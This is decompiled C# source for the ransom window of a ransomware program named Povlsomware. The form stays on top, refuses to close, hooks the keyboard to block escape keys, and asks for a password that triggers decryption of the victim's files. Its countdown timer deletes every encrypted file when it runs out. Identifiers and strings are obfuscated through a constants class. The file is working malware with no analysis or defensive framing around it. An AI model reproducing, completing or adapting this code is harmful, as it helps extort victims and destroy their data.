using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Povlsomware;

public class PayM3 : Form
{
	private struct Struct0
	{
		public Keys key;

		public int scanCode;

		public int flags;

		public int time;

		public IntPtr extra;
	}

	private delegate IntPtr Delegate0(int int_0, IntPtr intptr_0, IntPtr intptr_1);

	private bool bool_0;

	private IntPtr intptr_0;

	private Delegate0 delegate0_0;

	private int int_0 = Class5.m;

	private int int_1 = Class5.n;

	private IContainer icontainer_0;

	private TextBox textBox_0;

	private Button button_0;

	private Label label_0;

	private Label label_1;

	private Label m_a;

	private TextBox m_b;

	private BackgroundWorker c;

	private Label d;

	private Timer e;

	private Button f;

	private GroupBox g;

	private Label h;

	private GroupBox i;

	private Label j;

	private Label k;

	private Timer l;

	public PayM3()
	{
		b();
		((Control)label_1).set_Text(Class0.count + Class5.o);
		((Control)this.m_b).set_Text(Class5.p);
	}

	private void button_0_Click(object sender, EventArgs e)
	{
		string text = ((Control)textBox_0).get_Text();
		if (method_0(text.ToCharArray()))
		{
			bool_0 = true;
			((Control)button_0).set_Text(Class5.q);
			c.RunWorkerAsync(text);
		}
		else
		{
			((Control)textBox_0).set_Text(string.Empty);
			((ContainerControl)this).set_ActiveControl((Control)(object)textBox_0);
			((Control)button_0).set_Text(Class5.r);
		}
	}

	private bool method_0(char[] char_0)
	{
		char[] pass = Class0.GetPass();
		if (pass.Length == char_0.Length)
		{
			int num = 0;
			while (true)
			{
				if (num < char_0.Length)
				{
					if (pass[num] != char_0[num])
					{
						break;
					}
					num++;
					continue;
				}
				return true;
			}
			return false;
		}
		return false;
	}

	private void PayM3_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!bool_0)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void PayM3_Load(object sender, EventArgs e)
	{
		((Control)this).Show();
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		delegate0_0 = method_1;
		intptr_0 = SetWindowsHookEx(Class5.s, delegate0_0, GetModuleHandle(mainModule.ModuleName), 0u);
	}

	private void c_DoWork(object sender, DoWorkEventArgs e)
	{
		Class0.UndoAttack(e.Argument as string);
	}

	private void c_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Application.Exit();
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int int_2, Delegate0 delegate0_1, IntPtr intptr_1, uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr intptr_1, int int_2, IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys keys_0);

	private IntPtr method_1(int int_2, IntPtr intptr_1, IntPtr intptr_2)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Invalid comparison between Unknown and I4
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Invalid comparison between Unknown and I4
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Invalid comparison between Unknown and I4
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Invalid comparison between Unknown and I4
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Invalid comparison between Unknown and I4
		if (int_2 >= 0)
		{
			Struct0 @struct = (Struct0)Marshal.PtrToStructure(intptr_2, typeof(Struct0));
			if ((int)@struct.key == Class5.t || (int)@struct.key == Class5.u || ((int)@struct.key == Class5.v && method_2(@struct.flags)) || ((int)@struct.key == Class5.w && (Control.get_ModifierKeys() & Class5.x) == Class5.y))
			{
				return (IntPtr)1;
			}
		}
		return CallNextHookEx(intptr_0, int_2, intptr_1, intptr_2);
	}

	private bool method_2(int int_2)
	{
		return (int_2 & Class5.z) == Class5.A;
	}

	private void e_Tick(object sender, EventArgs e)
	{
		if (int_0 > 0)
		{
			int_0--;
			int num = int_0 / Class5.B;
			int num2 = int_0 % Class5.C / Class5.D;
			int num3 = int_0 % Class5.E;
			((Control)d).set_Text(num + Class5.F + num2 + Class5.G + num3);
		}
		else
		{
			string[] array = Class0.encryptedFiles.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				File.Delete(array[i]);
			}
			((Control)h).set_Text(Class5.H);
		}
	}

	private void f_Click(object sender, EventArgs e)
	{
		((Control)new Form1()).Show();
	}

	private void a(object sender, EventArgs e)
	{
		if (int_1 > 0)
		{
			int_1--;
			int num = int_1 / Class5.I;
			int num2 = int_1 % Class5.J / Class5.K;
			int num3 = int_1 % Class5.L;
			((Control)k).set_Text(num + Class5.M + num2 + Class5.N + num3);
		}
		else
		{
			((Control)j).set_Text(Class5.O);
			((Control)button_0).set_Visible(false);
			((Control)textBox_0).set_Visible(false);
			((Control)this.m_a).set_Visible(false);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void b()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected O, but got Unknown
		//IL_01bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0259: Expected O, but got Unknown
		//IL_028d: Unknown result type (might be due to invalid IL or missing references)
		//IL_030c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0316: Expected O, but got Unknown
		//IL_034a: Unknown result type (might be due to invalid IL or missing references)
		//IL_03da: Unknown result type (might be due to invalid IL or missing references)
		//IL_0459: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Expected O, but got Unknown
		//IL_0494: Unknown result type (might be due to invalid IL or missing references)
		//IL_0545: Unknown result type (might be due to invalid IL or missing references)
		//IL_054f: Expected O, but got Unknown
		//IL_0612: Unknown result type (might be due to invalid IL or missing references)
		//IL_061c: Expected O, but got Unknown
		//IL_0640: Unknown result type (might be due to invalid IL or missing references)
		//IL_075e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0768: Expected O, but got Unknown
		//IL_086f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0879: Expected O, but got Unknown
		//IL_08f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0902: Expected O, but got Unknown
		//IL_0a8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a97: Expected O, but got Unknown
		//IL_0a9c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ae7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af1: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(PayM3));
		textBox_0 = new TextBox();
		button_0 = new Button();
		label_0 = new Label();
		label_1 = new Label();
		this.m_a = new Label();
		this.m_b = new TextBox();
		c = new BackgroundWorker();
		d = new Label();
		e = new Timer(icontainer_0);
		f = new Button();
		g = new GroupBox();
		h = new Label();
		i = new GroupBox();
		j = new Label();
		k = new Label();
		l = new Timer(icontainer_0);
		((Control)g).SuspendLayout();
		((Control)i).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)textBox_0).set_Font(new Font(Class5.P, Class5.Q));
		((Control)textBox_0).set_Location(new Point(Class5.R, Class5.S));
		((Control)textBox_0).set_Margin(new Padding(2, 3, 2, 3));
		((Control)textBox_0).set_Name(Class5.T);
		((Control)textBox_0).set_Size(new Size(Class5.U, Class5.V));
		((Control)textBox_0).set_TabIndex(0);
		((Control)button_0).set_BackColor(SystemColors.InactiveCaption);
		((Control)button_0).set_Font(new Font(Class5.W, Class5.X));
		((Control)button_0).set_Location(new Point(Class5.Y, Class5.Z));
		((Control)button_0).set_Margin(new Padding(2, 3, 2, 3));
		((Control)button_0).set_Name(Class5.string_4);
		((Control)button_0).set_Size(new Size(Class5.int_2, Class5.sbyte_2));
		((Control)button_0).set_TabIndex(1);
		((Control)button_0).set_Text(Class5.string_5);
		((ButtonBase)button_0).set_UseVisualStyleBackColor(false);
		((Control)button_0).add_Click((EventHandler)button_0_Click);
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_Font(new Font(Class5.string_6, Class5.float_2, (FontStyle)1));
		((Control)label_0).set_ForeColor(SystemColors.ButtonFace);
		((Control)label_0).set_Location(new Point(Class5.int_3, Class5.sbyte_3));
		((Control)label_0).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label_0).set_Name(Class5.string_7);
		((Control)label_0).set_Size(new Size(Class5.int_4, Class5.a1));
		((Control)label_0).set_TabIndex(2);
		((Control)label_0).set_Text(Class5.b1);
		label_0.set_TextAlign((ContentAlignment)Class5.c1);
		((Control)label_1).set_AutoSize(true);
		((Control)label_1).set_Font(new Font(Class5.d1, Class5.e1, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_1).set_ForeColor(SystemColors.ButtonFace);
		((Control)label_1).set_Location(new Point(Class5.f1, Class5.g1));
		((Control)label_1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label_1).set_Name(Class5.h1);
		((Control)label_1).set_Size(new Size(Class5.i1, Class5.j1));
		((Control)label_1).set_TabIndex(3);
		((Control)label_1).set_Text(Class5.k1);
		((Control)this.m_a).set_AutoSize(true);
		((Control)this.m_a).set_ForeColor(SystemColors.ButtonFace);
		((Control)this.m_a).set_Location(new Point(Class5.l1, Class5.m1));
		((Control)this.m_a).set_Margin(new Padding(2, 0, 2, 0));
		((Control)this.m_a).set_Name(Class5.n1);
		((Control)this.m_a).set_Size(new Size(Class5.o1, Class5.p1));
		((Control)this.m_a).set_TabIndex(5);
		((Control)this.m_a).set_Text(Class5.q1);
		this.m_b.set_AcceptsReturn(true);
		((Control)this.m_b).set_BackColor(Color.Maroon);
		((Control)this.m_b).set_Font(new Font(Class5.r1, Class5.s1, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this.m_b).set_ForeColor(SystemColors.ButtonFace);
		((Control)this.m_b).set_Location(new Point(Class5.t1, Class5.u1));
		((Control)this.m_b).set_Margin(new Padding(2));
		((TextBoxBase)this.m_b).set_Multiline(true);
		((Control)this.m_b).set_Name(Class5.v1);
		((TextBoxBase)this.m_b).set_ReadOnly(true);
		((Control)this.m_b).set_Size(new Size(Class5.w1, Class5.x1));
		((Control)this.m_b).set_TabIndex(6);
		this.m_b.set_TextAlign((HorizontalAlignment)2);
		c.DoWork += c_DoWork;
		c.RunWorkerCompleted += c_RunWorkerCompleted;
		((Control)d).set_AutoSize(true);
		((Control)d).set_Font(new Font(Class5.y1, Class5.z1, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)d).set_ForeColor(Color.White);
		((Control)d).set_Location(new Point(Class5.A1, Class5.B1));
		((Control)d).set_Name(Class5.C1);
		((Control)d).set_Size(new Size(Class5.D1, Class5.E1));
		((Control)d).set_TabIndex(7);
		((Control)d).set_Text(Class5.F1);
		e.set_Enabled(true);
		e.set_Interval(Class5.G1);
		e.add_Tick((EventHandler)e_Tick);
		((Control)f).set_BackColor(SystemColors.InactiveCaption);
		((Control)f).set_Font(new Font(Class5.H1, Class5.I1));
		((Control)f).set_Location(new Point(Class5.J1, Class5.K1));
		((Control)f).set_Margin(new Padding(2, 3, 2, 3));
		((Control)f).set_Name(Class5.L1);
		((Control)f).set_Size(new Size(Class5.M1, Class5.N1));
		((Control)f).set_TabIndex((int)Class5.O1);
		((Control)f).set_Text(Class5.P1);
		((ButtonBase)f).set_UseVisualStyleBackColor(false);
		((Control)f).add_Click((EventHandler)f_Click);
		((Control)g).get_Controls().Add((Control)(object)h);
		((Control)g).get_Controls().Add((Control)(object)d);
		((Control)g).set_Location(new Point(4, Class5.Q1));
		((Control)g).set_Name(Class5.R1);
		((Control)g).set_Size(new Size(Class5.S1, Class5.T1));
		((Control)g).set_TabIndex((int)Class5.U1);
		g.set_TabStop(false);
		((Control)h).set_AutoSize(true);
		((Control)h).set_Font(new Font(Class5.V1, Class5.W1, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)h).set_Location(new Point(Class5.X1, Class5.Y1));
		((Control)h).set_Name(Class5.Z1);
		((Control)h).set_Size(new Size(Class5.int_5, Class5.sbyte_4));
		((Control)h).set_TabIndex(8);
		((Control)h).set_Text(Class5.string_8);
		((Control)i).get_Controls().Add((Control)(object)j);
		((Control)i).get_Controls().Add((Control)(object)k);
		((Control)i).set_Location(new Point(4, Class5.sbyte_5));
		((Control)i).set_Name(Class5.string_9);
		((Control)i).set_Size(new Size(Class5.int_6, Class5.int_7));
		((Control)i).set_TabIndex((int)Class5.sbyte_6);
		i.set_TabStop(false);
		((Control)j).set_AutoSize(true);
		((Control)j).set_Font(new Font(Class5.string_10, Class5.float_3, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)j).set_Location(new Point(Class5.a2, Class5.b2));
		((Control)j).set_Name(Class5.c2);
		((Control)j).set_Size(new Size(Class5.d2, Class5.e2));
		((Control)j).set_TabIndex(8);
		((Control)j).set_Text(Class5.f2);
		((Control)k).set_AutoSize(true);
		((Control)k).set_Font(new Font(Class5.g2, Class5.h2, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)k).set_ForeColor(Color.White);
		((Control)k).set_Location(new Point(Class5.i2, Class5.j2));
		((Control)k).set_Name(Class5.k2);
		((Control)k).set_Size(new Size(Class5.l2, Class5.m2));
		((Control)k).set_TabIndex(7);
		((Control)k).set_Text(Class5.n2);
		l.set_Enabled(true);
		l.set_Interval(Class5.o2);
		l.add_Tick((EventHandler)a);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(Class5.p2, Class5.q2));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(Class5.r2, Class5.s2));
		((Control)this).get_Controls().Add((Control)(object)i);
		((Control)this).get_Controls().Add((Control)(object)g);
		((Control)this).get_Controls().Add((Control)(object)f);
		((Control)this).get_Controls().Add((Control)(object)this.m_b);
		((Control)this).get_Controls().Add((Control)(object)this.m_a);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)button_0);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject(Class5.t2));
		((Form)this).set_Margin(new Padding(2, 3, 2, 3));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(Class5.u2);
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text(Class5.v2);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(PayM3_FormClosing));
		((Form)this).add_Load((EventHandler)PayM3_Load);
		((Control)g).ResumeLayout(false);
		((Control)g).PerformLayout();
		((Control)i).ResumeLayout(false);
		((Control)i).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
